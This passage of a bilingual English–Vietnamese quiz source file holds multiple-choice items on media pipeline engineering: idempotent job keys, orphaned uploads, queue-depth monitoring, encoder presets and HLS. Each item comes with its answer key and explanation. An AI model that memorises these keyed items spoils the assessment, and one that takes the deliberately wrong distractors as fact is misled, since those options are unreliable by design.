            'Bộ dựng key cố ý KHÔNG tất định, và điều đó hoàn toàn đúng với các lượt upload của người dùng: một dấu thời gian cộng sáu byte ngẫu nhiên nghĩa là hai lượt upload đồng thời không đụng nhau được và các key lân cận không đoán ra được bằng cách tăng dần. Bên trong một job có thể retry thì cũng tính chất đó lại là khiếm khuyết. Mọi hàng đợi đáng dùng đều là ÍT NHẤT MỘT LẦN — worker chết, visibility timeout hết hạn, deploy giữa chừng đều làm giao lại — nên một handler sinh key mới ở mỗi lượt chạy sẽ sinh ra một bộ output hoàn chỉnh mới ở mỗi lượt chạy. Dòng dữ liệu trỏ vào bộ cuối cùng, còn các bộ trước thì không đường mã nào với tới được: chúng là Mồ côi loại A, phần dung lượng bạn trả tiền mãi mãi mà chẳng có gì tham chiếu tới. Suy key đầu ra từ key đầu vào (<code>row.r2Key</code> với đuôi được thay và một hậu tố bậc thang được nối vào) khiến lượt chạy thứ hai ghi cùng những byte vào cùng một chỗ, và điều đó vô hại. Hãy đi kèm một phép kiểm trạng thái ở đầu handler — <code>if (row.status === \'READY\') return</code> — vốn tốn một truy vấn và biến một lượt giao trùng thành một thao tác rỗng. Phương án 1 sai về số học: <code>Date.now()</code> giữa lúc chết và lúc retry chênh nhau hàng giây, và phần hậu tố ngẫu nhiên thì chênh nhau bất kể thế nào. Phương án 2 bịa ra một ràng buộc mà các kho object không có; một lượt <code>PUT</code> vào key đã tồn tại sẽ ghi đè. Phương án 3 mô tả một bảo đảm mà không hàng đợi thực dụng nào cung cấp.',
          ),
        }),

        // q35 · đáp án 1
        mcq({
          prompt: B(
            'A user opens the composer, uploads a 40 MB video, then closes the tab without posting. The object is in storage and no database row references it. Which design stops it being billed forever, and what is the load-bearing detail?',
            'Một người dùng mở khung soạn bài, upload một video 40 MB, rồi đóng tab mà không đăng. Object nằm trong kho và không dòng cơ sở dữ liệu nào tham chiếu tới nó. Thiết kế nào ngăn nó bị tính tiền mãi mãi, và chi tiết nào là chi tiết chịu lực?',
          ),
          options: [
            B(
              'A nightly reconciliation that lists the bucket and deletes any key not referenced by a row. It needs no extra table, and the load-bearing detail is running it twice with a gap so an object uploaded during the first pass is not deleted before its post is created.',
              'Một lượt đối chiếu hằng đêm liệt kê bucket rồi xoá mọi key không được dòng nào tham chiếu. Nó không cần bảng phụ, và chi tiết chịu lực là chạy nó hai lượt cách nhau một khoảng để một object được upload trong lượt đầu không bị xoá trước khi bài đăng của nó kịp được tạo.',
            ),
            B(
              'A <code>pending_uploads</code> row written <b>at upload time</b> with a 24-hour expiry, deleted when the post is created, and swept by a cron job for anything still pending past expiry. The load-bearing detail is the ordering: the record is written <em>before</em> the object is claimed, because a cleanup list you build later cannot see uploads that were never referenced by anything.',
              'Một dòng <code>pending_uploads</code> được ghi <b>ngay lúc upload</b> với hạn 24 giờ, bị xoá khi bài đăng được tạo, và được một cron job quét dọn với bất cứ gì còn treo quá hạn. Chi tiết chịu lực là THỨ TỰ: bản ghi được ghi TRƯỚC khi object được nhận, vì một danh sách dọn dẹp bạn dựng về sau không thấy được những lượt upload chưa từng được thứ gì tham chiếu.',
            ),
            B(
              'A storage lifecycle rule that expires everything under the video prefix after 24 hours. The load-bearing detail is that the post-creation path must copy the object to a permanent prefix, which is a metadata-only operation and therefore cheap.',
              'Một lifecycle rule của kho lưu trữ cho mọi thứ dưới tiền tố video hết hạn sau 24 giờ. Chi tiết chịu lực là đường tạo bài đăng phải CHÉP object sang một tiền tố vĩnh viễn, vốn là một thao tác chỉ-siêu-dữ-liệu nên rẻ.',
            ),
            B(
              'A browser <code>beforeunload</code> handler that issues a delete for any upload the user has not yet posted. The load-bearing detail is using <code>navigator.sendBeacon</code> so the request survives the tab closing.',
              'Một handler <code>beforeunload</code> trong trình duyệt phát một lệnh xoá cho mọi lượt upload người dùng chưa đăng. Chi tiết chịu lực là dùng <code>navigator.sendBeacon</code> để yêu cầu đó sống sót qua lúc tab đóng.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The scenario is ordinary — people abandon composers constantly — and the object it leaves behind is unreachable from every code path in the application, so nothing will ever look at it again. The fix is to write down the fact that an upload happened at the moment it happens, with an expiry, and to treat the post-creation step as <em>claiming</em> that record. The ordering is the whole idea: a record created before the claim covers the window in which nothing else references the object, whereas any list assembled afterwards is built from references and therefore cannot contain an object that has none. Option 1 describes real reconciliation, which is a valid second layer and is what the Object Storage course covers — but it requires listing the whole bucket (expensive, and the listing cost is per object), and the two-pass rule it names exists precisely because it has no upload-time record to consult. Option 3 is dangerous as stated: a blanket 24-hour expiry on the prefix deletes successfully posted videos too unless every post moves its object, and object copies are not metadata-only — they rewrite the bytes. Option 4 relies on the client, which is exactly the party that just went away; <code>beforeunload</code> does not fire on a crash, a lost connection, or a phone that was put down.',
            'Kịch bản này bình thường — người ta bỏ dở khung soạn bài suốt — và cái object nó để lại thì không đường mã nào trong ứng dụng với tới được, nên sẽ chẳng bao giờ có gì nhìn tới nó nữa. Cách vá là GHI LẠI việc một lượt upload đã xảy ra ngay tại thời điểm nó xảy ra, kèm một hạn, và coi bước tạo bài đăng như một lượt NHẬN bản ghi đó. Thứ tự chính là toàn bộ ý tưởng: một bản ghi tạo ra trước lượt nhận thì bao phủ đúng cái cửa sổ mà không gì khác tham chiếu tới object, trong khi mọi danh sách ráp lại về sau đều dựng từ các THAM CHIẾU nên không thể chứa một object vốn chẳng có tham chiếu nào. Phương án 1 mô tả một lượt đối chiếu có thật, đó là một lớp thứ hai hợp lệ và là thứ khoá Object Storage nói tới — nhưng nó đòi liệt kê cả bucket (đắt, và chi phí liệt kê tính theo từng object), còn quy tắc hai-lượt mà nó nêu tồn tại chính vì nó không có bản ghi lúc upload nào để tra. Phương án 3 nguy hiểm như đã phát biểu: một lifecycle 24 giờ áp lên cả tiền tố sẽ xoá luôn những video đã đăng thành công trừ khi mọi bài đăng đều dời object của nó đi, mà chép object thì không phải thao tác chỉ-siêu-dữ-liệu — nó ghi lại toàn bộ byte. Phương án 4 dựa vào client, mà client đúng là bên vừa mới biến mất; <code>beforeunload</code> không nổ khi trình duyệt sập, khi mất kết nối, hay khi cái điện thoại được đặt xuống bàn.',
          ),
        }),

        /* ── Chương 6 — chi phí (4 câu) ───────────────────────────────────── */

        // q36 · đáp án 2
        mcq({
          prompt: B(
            'Storage is flat, bandwidth is flat, the invoice is unchanged, no alert has fired — and users report "processing…" lasting hours on a fixed-size VPS. What ran out, and what should the dashboard show?',
            'Dung lượng không đổi, băng thông không đổi, hoá đơn không đổi, không cảnh báo nào nổ — mà người dùng báo "đang xử lý…" kéo dài hàng giờ trên một VPS cỡ cố định. Cái gì đã cạn, và dashboard nên hiện gì?',
          ),
          options: [
            B(
              'Object-storage request quota. Class A operations are rate-limited per bucket, and once the limit is reached writes queue silently rather than erroring, which is why nothing appears on the invoice. Show the per-minute write rate against the quota.',
              'Hạn ngạch request của kho object. Các thao tác Class A bị giới hạn tốc độ theo từng bucket, và khi chạm giới hạn thì các lượt ghi xếp hàng trong im lặng thay vì báo lỗi, đó là lý do không có gì hiện trên hoá đơn. Hãy hiện tốc độ ghi mỗi phút so với hạn ngạch.',
            ),
            B(
              'Database connections. Progress updates from the encoder saturate the pool, so workers spend their time waiting on a connection rather than encoding; the queue looks stalled while CPU sits idle. Show pool utilisation and the rate of progress writes.',
              'Kết nối cơ sở dữ liệu. Các lượt cập nhật tiến độ từ bộ encode làm bão hoà pool, nên worker dành thời gian chờ một kết nối thay vì encode; hàng đợi trông như đứng im trong khi CPU rảnh rỗi. Hãy hiện mức dùng pool và tốc độ ghi tiến độ.',
            ),
            B(
              'CPU throughput. On a fixed VPS the CPU is already paid for monthly, so it never appears on an invoice — it runs out as a queue that grows by a constant amount per hour and never recovers on its own. Put queue depth on the dashboard next to CPU, and alert on its <em>derivative</em> ("depth increased for 30 consecutive minutes") rather than an absolute threshold, which only fires once you are already hours behind.',
              'Thông lượng CPU. Trên một VPS cố định thì CPU đã trả tiền theo tháng rồi, nên nó không bao giờ hiện trên hoá đơn — nó cạn dưới dạng một hàng đợi lớn thêm một lượng cố định mỗi giờ và không bao giờ tự hồi phục. Hãy đặt ĐỘ SÂU HÀNG ĐỢI lên dashboard cạnh CPU, và cảnh báo trên ĐẠO HÀM của nó ("độ sâu tăng liên tục 30 phút") thay vì một ngưỡng tuyệt đối, vốn chỉ nổ khi bạn đã trễ hàng giờ rồi.',
            ),
            B(
              'Disk. Temporary files from interrupted encodes accumulate until the filesystem is full, at which point new jobs block on write without raising an error the queue can see. Show free space on the partition holding the temp directory.',
              'Đĩa. File tạm từ những lượt encode bị ngắt tích tụ lại tới khi hệ thống file đầy, và lúc đó các job mới bị chặn ở lệnh ghi mà không ném ra lỗi nào hàng đợi thấy được. Hãy hiện dung lượng trống trên phân vùng chứa thư mục tạm.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Media adds a cost axis no invoice shows. On serverless, CPU is metered and an inefficiency arrives as a bigger bill, which somebody in finance eventually notices. On a fixed VPS the CPU is a constant you already bought, so an inefficiency arrives as reduced throughput — and if arrival rate exceeds service rate by any margin at all, the queue grows without bound. Nothing is down, no error is raised, every conventional metric is green, and the only visible symptom is that users wait. The instrumentation that catches it is the one thing not usually on a media dashboard: queue depth, watched as a trend. An absolute threshold ("depth > 1000") only fires when the backlog is already large, whereas a monotonic increase over half an hour distinguishes a capacity deficit from a spike while there is still time to act. All three distractors describe real failure modes with real fixes, and each is worth having on a dashboard — but each of them <em>does</em> produce a signal: request quotas return errors, a saturated pool shows up as connection wait time, and a full disk raises <code>ENOSPC</code>. The defining feature of the CPU case is that it produces no signal at all unless you build one.',
            'Media thêm một trục chi phí mà không hoá đơn nào hiện ra. Trên serverless, CPU được đo và tính tiền nên một chỗ kém hiệu quả tới dưới dạng một hoá đơn to hơn, và rồi có người bên tài chính sẽ để ý. Trên một VPS cố định thì CPU là một hằng số bạn đã mua rồi, nên chỗ kém hiệu quả tới dưới dạng thông lượng giảm — và nếu tốc độ tới vượt tốc độ phục vụ dù chỉ một chút, hàng đợi sẽ lớn lên vô hạn. Không có gì sập, không lỗi nào được ném, mọi chỉ số truyền thống đều xanh, và triệu chứng duy nhất nhìn thấy được là người dùng phải chờ. Phép đo bắt được nó lại đúng là thứ thường không có trên một dashboard media: ĐỘ SÂU HÀNG ĐỢI, theo dõi như một XU HƯỚNG. Một ngưỡng tuyệt đối ("độ sâu > 1000") chỉ nổ khi tồn đọng đã lớn, trong khi một chuỗi tăng đơn điệu suốt nửa giờ phân biệt được một thiếu hụt dung lượng với một cơn bùng phát trong lúc vẫn còn thời gian để hành động. Cả ba phương án nhiễu đều mô tả những kiểu hỏng có thật với cách vá có thật, và mỗi cái đều đáng có trên dashboard — nhưng mỗi cái đều CÓ sinh ra tín hiệu: hạn ngạch request trả về lỗi, một pool bão hoà hiện ra thành thời gian chờ kết nối, và một cái đĩa đầy thì ném <code>ENOSPC</code>. Đặc điểm định danh của trường hợp CPU là nó không sinh ra tín hiệu nào cả trừ khi bạn tự dựng một cái.',
          ),
        }),

        // q37 · đáp án 1
        mcq({
          prompt: B(
            'Measured on this machine: a 12-megapixel photo through Sharp to WebP q80 takes about 188 ms, while re-encoding a <em>ten-second</em> 720p clip at <code>-preset medium</code> takes about 922 ms and a badly-placed <code>-ss</code> on a three-minute clip takes 548 ms. What follows for a worker pool?',
            'Đo trên máy này: một tấm ảnh 12 megapixel qua Sharp ra WebP q80 mất khoảng 188 ms, trong khi encode lại một clip 720p dài <em>mười giây</em> ở <code>-preset medium</code> mất khoảng 922 ms và một lệnh <code>-ss</code> đặt sai chỗ trên clip ba phút mất 548 ms. Điều gì suy ra được cho một pool worker?',
          ),
          options: [
            B(
              'Nothing about pools — the numbers are all under a second, so a single shared pool with a generous concurrency limit handles both kinds of work, and the real lever is raising that limit until CPU saturates.',
              'Không suy ra được gì về pool — mọi con số đều dưới một giây, nên một pool dùng chung duy nhất với giới hạn concurrency rộng rãi xử lý được cả hai loại việc, và cái cần gạt thật là nâng giới hạn đó lên tới khi CPU bão hoà.',
            ),
            B(
              'Image and video work must not share a queue. Even at these small sizes one video occupies a worker as long as several images, and the gap widens with duration and resolution — a real minute-long clip is tens of seconds. Share a pool and a burst of video uploads stalls every avatar change on the site. Separate queues, separate concurrency limits, and size <code>-threads</code> as cores ÷ workers so the pool does not thrash.',
              'Việc ảnh và việc video không được dùng chung một hàng đợi. Ngay ở những kích thước nhỏ này, một video đã chiếm một worker lâu bằng vài tấm ảnh, và khoảng cách đó nới rộng theo thời lượng lẫn độ phân giải — một clip dài một phút thật là hàng chục giây. Dùng chung một pool thì một đợt upload video làm nghẽn mọi lần đổi avatar trên site. Hàng đợi riêng, giới hạn concurrency riêng, và đặt <code>-threads</code> bằng số nhân chia số worker để pool không giẫm đạp lên nhau.',
            ),
            B(
              'Video should be moved to a separate machine immediately, since the ratio between the two kinds of work is what determines whether tuning can help, and a ratio above three means no preset choice can close the gap.',
              'Video nên được dời sang một máy riêng ngay lập tức, vì tỉ số giữa hai loại việc mới là thứ quyết định việc tinh chỉnh có giúp được không, và một tỉ số trên ba nghĩa là không lựa chọn preset nào khép được khoảng cách.',
            ),
            B(
              'The image path is the one to optimise, because 188 ms multiplied by a high upload rate dominates total CPU; video jobs are rare enough that their per-job cost does not affect the pool.',
              'Đường ảnh mới là thứ cần tối ưu, vì 188 ms nhân với một tốc độ upload cao sẽ chiếm phần lớn tổng CPU; job video hiếm tới mức chi phí mỗi job của chúng không ảnh hưởng tới pool.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The absolute numbers here are small because the fixtures are small — a ten-second synthetic clip is not a user\'s minute-long phone video — but the <em>shape</em> is the point and it only gets worse with real inputs. A worker processing one video is unavailable for images for the whole duration, so a shared queue turns "ten people uploaded videos" into "nobody\'s avatar updates for minutes". The two workloads also want different concurrency: images are short and benefit from several in flight, video is long and each instance already wants multiple threads. That is the second half of the answer — ffmpeg defaults to using every core, which is wrong inside a pool, so pass <code>-threads</code> explicitly and size it as cores divided by workers. Two workers at three threads each on a six-core box is fully utilised and predictable; four workers each grabbing six threads is twenty-four threads fighting over six cores, where every encode takes longer and nothing finishes sooner. Option 1 reads the fixture sizes as the production sizes. Option 3 jumps to hardware before the free lever (separate queues, correct thread counts) has been pulled. Option 4 inverts the priority: the tail is what fills workers, and Chapter 6 makes the point that optimising the median while the p99 stalls the queue is effort spent where nobody can see it.',
            'Các con số tuyệt đối ở đây nhỏ vì file mẫu nhỏ — một clip tổng hợp mười giây không phải video điện thoại dài một phút của người dùng — nhưng HÌNH DẠNG mới là điểm mấu chốt, và nó chỉ tệ hơn với đầu vào thật. Một worker đang xử lý một video thì suốt thời gian đó không phục vụ ảnh được, nên một hàng đợi dùng chung biến "mười người vừa upload video" thành "không ai đổi được avatar suốt mấy phút". Hai loại tải này còn muốn hai kiểu concurrency khác nhau: ảnh thì ngắn và có lợi khi chạy vài cái cùng lúc, video thì dài và mỗi lượt đã tự muốn nhiều luồng. Đó là nửa sau của câu trả lời — ffmpeg mặc định dùng MỌI nhân, và điều đó là sai bên trong một pool, nên hãy truyền <code>-threads</code> tường minh và đặt nó bằng số nhân chia số worker. Hai worker mỗi cái ba luồng trên một máy sáu nhân thì dùng hết công suất và có độ trễ dự đoán được; bốn worker mỗi cái vơ sáu luồng là hai mươi tư luồng tranh nhau sáu nhân, ở đó mọi lượt encode đều lâu hơn mà chẳng cái nào xong sớm hơn. Phương án 1 đọc kích thước file mẫu như thể đó là kích thước production. Phương án 3 nhảy sang phần cứng trước khi kéo cái cần gạt miễn phí (hàng đợi riêng, số luồng đúng). Phương án 4 lộn ngược thứ tự ưu tiên: chính phần ĐUÔI mới lấp đầy worker, và Chương 6 nêu rõ rằng tối ưu trung vị trong khi p99 làm nghẽn hàng đợi là công sức bỏ vào chỗ không ai thấy.',
          ),
        }),

        // q38 · đáp án 2
        mcq({
          prompt: B(
            'Two sweeps on this machine, quality and CRF held fixed within each:' +
              code("WebP q=80  effort=0 →  289 KB   123 ms\n           effort=2 →  269 KB   143 ms\n           effort=4 →  264 KB   188 ms\n           effort=6 →  259 KB   320 ms\n\nx264 crf=23  ultrafast   228 ms      superfast   360 ms\n             veryfast    437 ms      faster      618 ms\n             fast        799 ms      medium      855 ms\n             slow       1316 ms") +
              'What do these two dials have in common, and what does the repo comment "0 = best compression, 6 = fastest" tell you?',
            'Hai lượt quét trên máy này, quality và CRF đều được giữ cố định trong mỗi lượt:' +
              code("WebP q=80  effort=0 →  289 KB   123 ms\n           effort=2 →  269 KB   143 ms\n           effort=4 →  264 KB   188 ms\n           effort=6 →  259 KB   320 ms\n\nx264 crf=23  ultrafast   228 ms      superfast   360 ms\n             veryfast    437 ms      faster      618 ms\n             fast        799 ms      medium      855 ms\n             slow       1316 ms") +
              'Hai cái núm này có gì chung, và câu comment trong kho "0 = nén tốt nhất, 6 = nhanh nhất" nói lên điều gì?',
          ),
          options: [
            B(
              'Both dials trade visual quality for speed, which is why the size falls as the time rises; the repo comment is correct for the libvips version the code was written against, and the safe response is to pin that version rather than change the number.',
              'Cả hai núm đều đổi chất lượng thị giác lấy tốc độ, và đó là lý do kích thước giảm khi thời gian tăng; câu comment trong kho đúng với phiên bản libvips mà mã được viết cho, và phản ứng an toàn là ghim phiên bản đó lại thay vì đổi con số.',
            ),
            B(
              'They are unrelated: <code>effort</code> is a WebP-only knob controlling the number of encoding passes, while a preset selects an entire rate-control algorithm, so the two curves happening to look alike is coincidence. The repo comment describes the preset scale, which does run from best to fastest.',
              'Chúng không liên quan: <code>effort</code> là một núm chỉ có ở WebP, điều khiển số lượt encode, còn preset thì chọn hẳn một thuật toán điều khiển tốc độ bit, nên hai đường cong trông giống nhau chỉ là trùng hợp. Câu comment trong kho mô tả thang preset, vốn đúng là chạy từ tốt nhất tới nhanh nhất.',
            ),
            B(
              'Both trade <b>CPU for bytes at fixed visual quality</b> — the quality knob is the other dial and it is held constant in both sweeps. Both curves also flatten: 4 → 6 costs 1.7× the CPU for 1.9% fewer bytes here. And the repo comment is <b>stale</b>: measured on sharp 0.35.4, effort 0 is the fastest and largest (123 ms, 289 KB) and effort 6 the slowest and smallest (320 ms, 259 KB), the opposite of what it says. Verify the direction by timing both ends rather than reading a comment.',
              'Cả hai đều đổi <b>CPU lấy BYTE ở chất lượng thị giác cố định</b> — cái núm quality mới là cái kia, và nó được giữ hằng trong cả hai lượt quét. Cả hai đường cong cũng đều PHẲNG DẦN: 4 → 6 ở đây tốn 1,7 lần CPU cho 1,9% byte ít hơn. Và câu comment trong kho đã <b>lạc hậu</b>: đo trên sharp 0.35.4, effort 0 là nhanh nhất và to nhất (123 ms, 289 KB) còn effort 6 là chậm nhất và nhỏ nhất (320 ms, 259 KB), ngược hẳn với những gì nó nói. Hãy kiểm chiều bằng cách bấm giờ hai đầu thay vì đọc một dòng comment.',
            ),
            B(
              'Both are latency knobs with no effect on output size; the size column varies only because WebP writes a variable-length header per pass. The repo comment is about that header and remains accurate, which is why the byte differences are small.',
              'Cả hai đều là núm độ trễ và không ảnh hưởng tới kích thước output; cột kích thước biến thiên chỉ vì WebP ghi một header có độ dài thay đổi cho mỗi lượt. Câu comment trong kho nói về cái header đó và vẫn còn chính xác, đó là lý do chênh lệch byte rất nhỏ.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Two independent dials per encoder. <b>Quality</b> (or CRF) decides what the output <em>looks</em> like. <b>Effort</b> (or preset) decides how hard the encoder searches for a smaller way to express that same visual result — so it costs CPU and buys bytes, with no quality change at all. Both sweeps hold the quality dial fixed, which is what makes them comparable, and both flatten: on this content, moving from effort 4 to 6 costs 1.7× the CPU to save 1.9% of the bytes, which is a bad trade per upload and a good one for an asset served millions of times. The comment is the real lesson. It says 0 is best compression and 6 is fastest; the measurement says the opposite, unambiguously, because 320 ms cannot be the fast end. Scales flip between library versions and stale comments outlive the code, so the check is one command: encode the same image at both ends and see which is slower. One honest caveat on the preset table — encode <em>time</em> is monotonic here, but output <em>size</em> was not (on this synthetic clip <code>veryfast</code> came out smaller than <code>medium</code>), so the size column is deliberately omitted from the question. Option 1 conflates the two dials. Option 2 denies a real structural analogy. Option 4 is contradicted by an 11% size spread across the effort column.',
            'Mỗi bộ encode có hai núm độc lập. <b>Quality</b> (hoặc CRF) quyết định output TRÔNG như thế nào. <b>Effort</b> (hoặc preset) quyết định bộ encode tìm kiếm chăm chỉ tới đâu để diễn đạt cùng kết quả thị giác đó bằng ít byte hơn — nên nó tốn CPU và mua về byte, hoàn toàn không đổi chất lượng. Cả hai lượt quét đều giữ cố định cái núm quality, và chính điều đó khiến chúng so sánh được, và cả hai đều phẳng dần: trên nội dung này, đi từ effort 4 lên 6 tốn 1,7 lần CPU để tiết kiệm 1,9% số byte, một đánh đổi tệ cho mỗi lượt upload và một đánh đổi tốt cho một tài nguyên phục vụ hàng triệu lần. Câu comment mới là bài học thật. Nó nói 0 là nén tốt nhất và 6 là nhanh nhất; phép đo nói ngược lại, không mập mờ, vì 320 ms không thể là đầu nhanh được. Các thang bị lật giữa các phiên bản thư viện và những dòng comment lạc hậu thì sống lâu hơn mã, nên phép kiểm chỉ là một lệnh: encode cùng tấm ảnh ở hai đầu rồi xem cái nào chậm hơn. Một lưu ý trung thực về bảng preset — THỜI GIAN encode ở đây đơn điệu, nhưng KÍCH THƯỚC output thì không (trên clip tổng hợp này <code>veryfast</code> ra nhỏ hơn <code>medium</code>), nên cột kích thước được cố ý bỏ khỏi đề bài. Phương án 1 gộp hai cái núm làm một. Phương án 2 phủ nhận một phép tương tự có thật về cấu trúc. Phương án 4 bị chính khoảng chênh 11% kích thước dọc cột effort bác bỏ.',
          ),
        }),

        // q39 · đáp án 0
        mcq({
          prompt: B(
            'Four files were pushed through the identical pipeline — <code>resize(1200, withoutEnlargement)</code> then <code>webp({ quality: 80, effort: 4 })</code>:' +
              code("photo-4032x3024.jpg   nguồn 7857079 B → webp 270624 B  (tỉ lệ 0.034)\nscreenshot-1600x1000  nguồn  278846 B → webp  86714 B  (tỉ lệ 0.311)\navatar-400.png        nguồn  220468 B → webp  29548 B  (tỉ lệ 0.134)\nalready-small.jpg     nguồn    5871 B → webp   7288 B  (tỉ lệ 1.241)") +
              'What do you do with the last row, and what do you do first?',
            'Bốn file được đẩy qua đúng một pipeline — <code>resize(1200, withoutEnlargement)</code> rồi <code>webp({ quality: 80, effort: 4 })</code>:' +
              code("photo-4032x3024.jpg   nguồn 7857079 B → webp 270624 B  (tỉ lệ 0,034)\nscreenshot-1600x1000  nguồn  278846 B → webp  86714 B  (tỉ lệ 0,311)\navatar-400.png        nguồn  220468 B → webp  29548 B  (tỉ lệ 0,134)\nalready-small.jpg     nguồn    5871 B → webp   7288 B  (tỉ lệ 1,241)") +
              'Bạn làm gì với dòng cuối, và làm gì TRƯỚC?',
          ),
          options: [
            B(
              'The last row is a re-encode that came out 24% <em>larger</em>, which argues for a "keep the original if the output is not smaller" branch — but measure how often it fires before you add it. At 0.3% of uploads the branch is not worth the code path; at 15%, which a corpus of already-optimised web images will show, it is a real saving and it also stops you generationally recompressing files that were already fine.',
              'Dòng cuối là một lượt encode lại ra TO HƠN 24%, và điều đó biện minh cho một nhánh "giữ bản gốc nếu output không nhỏ hơn" — nhưng hãy ĐO xem nó phát tác thường xuyên tới đâu trước khi thêm vào. Ở mức 0,3% số upload thì nhánh đó không đáng một đường mã; ở mức 15%, con số mà một tập mẫu ảnh web vốn đã tối ưu sẽ cho thấy, thì đó là khoản tiết kiệm thật và nó còn chặn việc bạn nén lại qua các thế hệ những file vốn đã ổn.',
            ),
            B(
              'The last row means the quality setting is too high for small inputs, so the first move is a size-dependent quality ramp — q80 above 1 MP, q65 below it — after which every ratio falls under 1.0 and no special branch is needed.',
              'Dòng cuối nghĩa là mức quality quá cao với đầu vào nhỏ, nên nước đi đầu tiên là một thang quality theo kích thước — q80 trên 1 MP, q65 dưới mức đó — sau đó mọi tỉ lệ đều xuống dưới 1,0 và không cần nhánh đặc biệt nào.',
            ),
            B(
              'The last row is a corpus problem: a 5,871-byte file is not representative of production traffic, so it should be removed from the benchmark set and the conclusion drawn from the three remaining rows, whose ratios are all healthy.',
              'Dòng cuối là vấn đề của tập mẫu: một file 5.871 byte không đại diện cho lưu lượng thật, nên nó nên bị loại khỏi bộ benchmark và kết luận được rút ra từ ba dòng còn lại, vốn có tỉ lệ đều lành mạnh.',
            ),
            B(
              'The last row shows WebP is the wrong default and the pipeline should choose per input — PNG for anything under 100 KB, WebP above — which the ratio column supports since the two smallest inputs have the two worst ratios.',
              'Dòng cuối cho thấy WebP là mặc định sai và pipeline nên chọn theo từng đầu vào — PNG cho mọi thứ dưới 100 KB, WebP cho trên mức đó — và cột tỉ lệ ủng hộ điều đó vì hai đầu vào nhỏ nhất có hai tỉ lệ tệ nhất.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Two things are being tested. First, that you recognise a ratio above 1.0 for what it is: re-encoding a small, already-compressed source spends CPU to produce a bigger file <em>and</em> a worse one, because a second lossy pass faithfully reproduces the first encoder\'s artifacts and adds its own. Second, and more important, the order of operations — measure the frequency before adding the branch. A conditional that fires on 0.3% of uploads is complexity with no return; the same conditional at 15% is a real saving. That number is a property of your traffic, not of the format, which is why the lesson insists on benchmarking your own corpus: the ratios above span 0.034 to 1.241 on four files from the same pipeline, a spread of 36×. Option 2 treats a symptom with a rule that damages the common case; the small file is not badly encoded at q80, it is simply already efficient. Option 3 removes the one file that taught you something — an unrepresentative corpus is one that contains <em>only</em> clean cases. Option 4 draws a rule the data does not support: the avatar is small and compresses to 0.134, and the screenshot is the poor performer at 0.311, so size is not the predictor. Note also that a PNG-versus-WebP claim needs its own measurement, and on this screenshot fixture WebP won comfortably — 86,714 bytes against 409,427 for PNG.',
            'Có hai thứ đang được kiểm. Thứ nhất, bạn có nhận ra một tỉ lệ trên 1,0 đúng bản chất của nó không: encode lại một nguồn nhỏ vốn đã nén là tiêu CPU để sinh ra một file vừa to hơn VỪA tệ hơn, vì một lượt nén mất dữ liệu thứ hai tái tạo trung thành artifact của bộ encode trước rồi cộng thêm artifact của chính nó. Thứ hai, và quan trọng hơn, là THỨ TỰ THAO TÁC — đo tần suất trước khi thêm nhánh. Một câu điều kiện phát tác trên 0,3% số upload là độ phức tạp không có hồi báo; cũng câu điều kiện đó ở mức 15% thì là khoản tiết kiệm thật. Con số ấy là tính chất của LƯU LƯỢNG của bạn, không phải của định dạng, và đó là lý do bài học khăng khăng đòi benchmark trên tập mẫu của chính bạn: các tỉ lệ ở trên trải từ 0,034 tới 1,241 trên bốn file qua cùng một pipeline, tức chênh 36 lần. Phương án 2 chữa triệu chứng bằng một quy tắc làm hại trường hợp phổ biến; file nhỏ đó không hề bị encode tệ ở q80, nó chỉ đơn giản là vốn đã hiệu quả sẵn. Phương án 3 loại đi đúng cái file đã dạy bạn được điều gì đó — một tập mẫu không đại diện là tập mẫu CHỈ chứa các trường hợp sạch. Phương án 4 rút ra một quy tắc mà dữ liệu không ủng hộ: cái avatar thì nhỏ và nén xuống 0,134, còn ảnh chụp màn hình mới là cái kém nhất ở 0,311, nên kích thước không phải yếu tố dự báo. Cũng lưu ý rằng một khẳng định PNG-so-với-WebP cần phép đo riêng của nó, và trên file ảnh chụp màn hình này thì WebP thắng thoải mái — 86.714 byte so với 409.427 của PNG.',
          ),
        }),

        /* ── Chương 7 — streaming (4 câu) ─────────────────────────────────── */

        // q40 · đáp án 3
        mcq({
          prompt: B(
            'A feed shows 15-second clips as plain MP4 files. Someone proposes moving to HLS. A three-rendition ladder was built from a 10-second clip and counted:' +
              code("MP4 progressive  →      1 object ·  3.645.995 B\nbậc thang HLS    →     19 object ·  8.488.739 B\n(5 segment × 3 bản + 3 index + 1 master)") +
              'What does HLS actually buy, and what is the object count really telling you?',
            'Một feed hiện các clip 15 giây dưới dạng file MP4 thường. Có người đề xuất chuyển sang HLS. Một bậc thang ba bản đã được dựng từ một clip 10 giây và đếm lại:' +
              code("MP4 progressive  →      1 object ·  3.645.995 B\nbậc thang HLS    →     19 object ·  8.488.739 B\n(5 segment × 3 bản + 3 index + 1 master)") +
              'HLS thật sự mua được gì, và con số đếm object thật ra đang nói gì?',
          ),
          options: [
            B(
              'It buys faster startup, because a player begins with a 2-second segment instead of waiting for the whole file; the object count is the price of that and scales with segment length, so raising <code>hls_time</code> to 10 gets most of the benefit at a fifth of the objects.',
              'Nó mua được khởi động nhanh hơn, vì trình phát bắt đầu với một segment 2 giây thay vì chờ cả file; số object là cái giá của điều đó và tỉ lệ theo độ dài segment, nên nâng <code>hls_time</code> lên 10 sẽ được phần lớn lợi ích với một phần năm số object.',
            ),
            B(
              'It buys nothing here and costs nothing either — the byte totals are within a factor of three and object storage charges by volume, so the decision is purely about player complexity and can be made on taste.',
              'Nó chẳng mua được gì ở đây mà cũng chẳng tốn gì — tổng byte chênh nhau chưa tới ba lần và kho object tính tiền theo dung lượng, nên quyết định thuần tuý là chuyện độ phức tạp của trình phát và có thể chọn theo sở thích.',
            ),
            B(
              'It buys seeking. A progressive MP4 must be downloaded from byte zero before a viewer can jump to the middle, whereas a segmented stream lets the player fetch only the segment it needs; the object count is what makes that possible and is therefore not a cost at all.',
              'Nó mua được khả năng TUA. Một MP4 progressive phải tải từ byte số không trước khi người xem nhảy được vào giữa, còn một luồng cắt segment cho phép trình phát chỉ lấy đúng segment nó cần; số object chính là thứ làm điều đó khả thi và vì vậy không phải chi phí gì cả.',
            ),
            B(
